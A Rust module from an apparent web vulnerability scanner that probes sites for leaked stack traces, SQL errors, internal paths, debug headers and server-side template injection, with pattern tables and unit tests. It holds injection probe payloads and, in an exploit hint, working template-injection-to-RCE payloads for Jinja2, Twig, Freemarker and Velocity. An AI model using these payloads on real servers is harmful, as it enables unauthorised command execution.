//! Error / debug information disclosure probe.
//!
//! Intentionally triggers error conditions and inspects the response for:
//!   1. Stack traces (Python traceback, Java stack, PHP fatal, Ruby backtrace)
//!   2. Internal filesystem paths (/home/user, /var/www, C:\inetpub, /app)
//!   3. Framework debug pages (Django debug, Laravel Whoops, Rails error page)
//!   4. Verbose SQL errors (syntax error near, ORA-, mysql_error)
//!   5. Server-side template injection echo ({{7*7}} → 49)
//!   6. Debug mode headers (X-Debug-Token, X-Debugbar-*)

use gossan_core::Target;
use reqwest::Client;
use secfinding::{Evidence, Finding, Severity};

// SSTI probe values — use a large unique product that is extremely unlikely
// to appear naturally in any page, eliminating false positives.
// 473 × 337 = 159401   (Jinja2, Twig, Pebble, etc.)
// 473 × 337 evaluated by Java EL / Spring SpEL as well.
const SSTI_PRODUCT: &str = "159401";

/// Payloads that trigger framework-specific error pages
const ERROR_TRIGGERS: &[(&str, &str)] = &[
    // Path traversal / nonexistent path triggers 404 → inspect error page
    ("/gossan-error-probe-9z3k2p", "random 404"),
    // Malformed query string
    ("/?__gossan__=<script>x</script>", "XSS reflection / error"),
    // Template injection probe — unique product 473*337=159401
    ("/?q={{473*337}}", "SSTI probe {{473*337}} → 159401"),
    ("/?q=${473*337}", "SSTI probe ${473*337} (Java EL)"),
    ("/?q=<%=473*337%>", "SSTI probe <%=473*337%> (ERB)"),
    // Ruby on Rails specific
    ("/?q=<%= 473*337 %>", "SSTI probe ERB with spaces"),
    // SQL error trigger
    ("/?id=1'", "SQL injection probe"),
    ("/?id=1\"", "SQL injection probe (double quote)"),
    // Type confusion
    ("/?page[]=1&page[]=2", "PHP array confusion"),
];

/// Patterns in error response bodies that indicate information disclosure
const STACK_TRACE_PATTERNS: &[(&str, &str, Severity)] = &[
    // Python / Django
    (
        "Traceback (most recent call last)",
        "Python traceback in error response",
        Severity::High,
    ),
    (
        "django.core.exceptions",
        "Django exception in error response",
        Severity::High,
    ),
    (
        "File \"/",
        "Python file path in error response",
        Severity::Medium,
    ),
    // Java / Spring
    (
        "java.lang.",
        "Java exception in error response",
        Severity::High,
    ),
    (
        "org.springframework",
        "Spring framework exception",
        Severity::High,
    ),
    (
        "at com.",
        "Java stack frame in error response",
        Severity::Medium,
    ),
    (
        "Caused by:",
        "Java exception chain in response",
        Severity::Medium,
    ),
    // PHP
    (
        "Fatal error:",
        "PHP fatal error in response",
        Severity::High,
    ),
    ("Warning: ", "PHP warning in response", Severity::Medium),
    (
        "Stack trace:",
        "PHP stack trace in response",
        Severity::High,
    ),
    ("on line ", "PHP error with line number", Severity::Medium),
    // Ruby / Rails
    (
        "app/controllers/",
        "Rails controller path in response",
        Severity::High,
    ),
    (
        "ActionController::",
        "Rails ActionController exception",
        Severity::High,
    ),
    // Node.js
    (
        "at Object.<anonymous>",
        "Node.js stack frame in response",
        Severity::High,
    ),
    (
        "at Module._compile",
        "Node.js module stack in response",
        Severity::High,
    ),
    // SQL errors
    (
        "syntax error near",
        "SQL syntax error in response",
        Severity::High,
    ),
    ("ORA-", "Oracle SQL error in response", Severity::High),
    ("mysql_error", "MySQL error in response", Severity::High),
    ("pg_query", "PostgreSQL error in response", Severity::High),
    ("SQLSTATE[", "PDO SQL error in response", Severity::High),
    (
        "Unclosed quotation mark",
        "MSSQL error in response",
        Severity::High,
    ),
    // Internal paths
    ("/home/", "Internal Unix path in response", Severity::Medium),
    ("/var/www/", "Web root path in response", Severity::Medium),
    ("C:\\inetpub", "IIS path in response", Severity::Medium),
    (
        "C:\\Users\\",
        "Windows user path in response",
        Severity::Medium,
    ),
    ("/app/", "Container app path in response", Severity::Medium),
    // SSTI confirmation — {{473*337}} evaluates to 159401 (unique, no false positives)
    (
        "159401",
        "SSTI confirmed — arithmetic expression evaluated to 159401",
        Severity::Critical,
    ),
    // Framework debug mode
    (
        "Whoops! There was an error.",
        "Laravel Whoops debug page",
        Severity::High,
    ),
    ("DEBUG = True", "Django DEBUG mode active", Severity::High),
    (
        "development mode",
        "Framework in development mode",
        Severity::High,
    ),
];

/// Debug headers that should never appear in production
const DEBUG_HEADERS: &[(&str, &str, Severity)] = &[
    (
        "x-debug-token",
        "Symfony debug token leaked",
        Severity::Medium,
    ),
    (
        "x-debug-token-link",
        "Symfony Profiler URL exposed",
        Severity::Medium,
    ),
    ("x-debugbar-id", "PHP DebugBar active", Severity::Medium),
    ("x-powered-cgi", "CGI mode exposed", Severity::Low),
    (
        "x-application-context",
        "Spring app context exposed",
        Severity::Medium,
    ),
    (
        "x-envoy-upstream-service-time",
        "Envoy/Istio internal timing",
        Severity::Low,
    ),
];

pub async fn probe(client: &Client, target: &Target) -> anyhow::Result<Vec<Finding>> {
    let Target::Web(asset) = target else {
        return Ok(vec![]);
    };
    let base = asset.url.as_str().trim_end_matches('/');
    let mut findings = Vec::new();
    let mut reported_patterns: std::collections::HashSet<&str> = std::collections::HashSet::new();

    for (suffix, _trigger_desc) in ERROR_TRIGGERS {
        let url = format!("{}{}", base, suffix);
        let Ok(resp) = client.get(&url).send().await else {
            continue;
        };
        let status = resp.status().as_u16();

        // Collect response headers before consuming body
        let resp_headers: Vec<(String, String)> = resp
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();

        // ── Debug header check ─────────────────────────────────────────────
        for (header, name, severity) in DEBUG_HEADERS {
            if let Some((_, val)) = resp_headers
                .iter()
                .find(|(k, _)| k.eq_ignore_ascii_case(header))
            {
                if reported_patterns.insert(header) {
                    findings.push(
                        crate::finding_builder(target, *severity,
                            format!("{} header present", name),
                            format!("Response to {} contains debug header {}: {}. \
                                     Debug infrastructure is active and leaking implementation details.",
                                     url, header, val.chars().take(80).collect::<String>()))
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![(header.to_string(), val.clone())],
                            body_excerpt: None,
                        })
                        .tag("debug").tag("exposure").tag("headers")
                        .build().expect("finding builder: required fields are set")
                    );
                }
            }
        }

        let body = resp.text().await.unwrap_or_default();

        // SSTI: only flag 159401 if the trigger was actually a template probe
        let is_ssti_probe = suffix.contains("473*337");

        // ── Body pattern scan ──────────────────────────────────────────────
        for (pattern, name, severity) in STACK_TRACE_PATTERNS {
            // SSTI confirmation requires the right trigger
            if *pattern == "49" && !is_ssti_probe {
                continue;
            }

            if body.contains(pattern) && reported_patterns.insert(pattern) {
                // Find the line containing the pattern for context
                let excerpt = body
                    .lines()
                    .find(|l| l.contains(pattern))
                    .map(|l| l.trim().chars().take(200).collect::<String>())
                    .unwrap_or_default();

                let is_ssti = *pattern == SSTI_PRODUCT && is_ssti_probe;
                let detail = if is_ssti {
                    format!("SSTI confirmed — template expression `{{{{473*337}}}}` evaluated to `159401` in response. \
                             The template engine executes injected expressions server-side. \
                             Escalate to RCE by injecting OS commands via the template syntax. URL: {}", url)
                } else {
                    format!("{} detected in error response from {}. \
                             This discloses server internals to unauthenticated attackers — \
                             internal paths, framework versions, and class names aid further attacks.", name, url)
                };

                findings.push(
                    crate::finding_builder(target,
                        if is_ssti { Severity::Critical } else { *severity },
                        if is_ssti { "Server-Side Template Injection (SSTI) confirmed" } else { name },
                        detail)
                    .evidence(Evidence::HttpResponse {
                        status,
                        headers: vec![],
                        body_excerpt: Some(excerpt),
                    })
                    .tag("error-disclosure").tag("debug").tag("exposure")
                    .tag(if is_ssti { "ssti" } else { "stack-trace" })
                    .exploit_hint(if is_ssti {
                        format!(
                            "# Escalate SSTI to RCE (adapt to detected engine):\n\
                             # Jinja2/Python:\n\
                             #   {}?q={{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\n\
                             # Jinja2 (no config):\n\
                             #   {}?q={{{{''.__class__.mro()[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}}}\n\
                             # Twig/PHP:\n\
                             #   {}?q={{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}\n\
                             # Freemarker/Java:\n\
                             #   {}?q=${{\"freemarker.template.utility.Execute\"?new()('id')}}\n\
                             # Velocity/Java:\n\
                             #   {}?q=#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()",
                            base, base, base, base, base)
                    } else {
                        String::new()
                    })
                    .build().expect("finding builder: required fields are set")
                );
            }
        }

        // Stop after finding critical issues — don't keep probing
        if findings
            .iter()
            .any(|f: &Finding| f.severity == Severity::Critical)
        {
            break;
        }
    }

    Ok(findings)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ssti_trigger_payloads_are_present() {
        assert!(ERROR_TRIGGERS
            .iter()
            .any(|(path, _)| path.contains("{{473*337}}")));
        assert!(ERROR_TRIGGERS
            .iter()
            .any(|(path, _)| path.contains("${473*337}")));
        assert!(ERROR_TRIGGERS
            .iter()
            .any(|(path, _)| path.contains("<%=473*337%>")));
    }

    #[test]
    fn stack_trace_patterns_cover_multiple_frameworks() {
        assert!(STACK_TRACE_PATTERNS
            .iter()
            .any(|(pattern, _, _)| *pattern == "Traceback (most recent call last)"));
        assert!(STACK_TRACE_PATTERNS
            .iter()
            .any(|(pattern, _, _)| *pattern == "java.lang."));
        assert!(STACK_TRACE_PATTERNS
            .iter()
            .any(|(pattern, _, _)| *pattern == "Fatal error:"));
        assert!(STACK_TRACE_PATTERNS
            .iter()
            .any(|(pattern, _, _)| *pattern == SSTI_PRODUCT));
    }

    #[test]
    fn debug_headers_cover_common_frameworks() {
        assert!(DEBUG_HEADERS
            .iter()
            .any(|(header, _, _)| *header == "x-debug-token"));
        assert!(DEBUG_HEADERS
            .iter()
            .any(|(header, _, _)| *header == "x-debugbar-id"));
        assert!(DEBUG_HEADERS
            .iter()
            .any(|(header, _, _)| *header == "x-application-context"));
    }
}
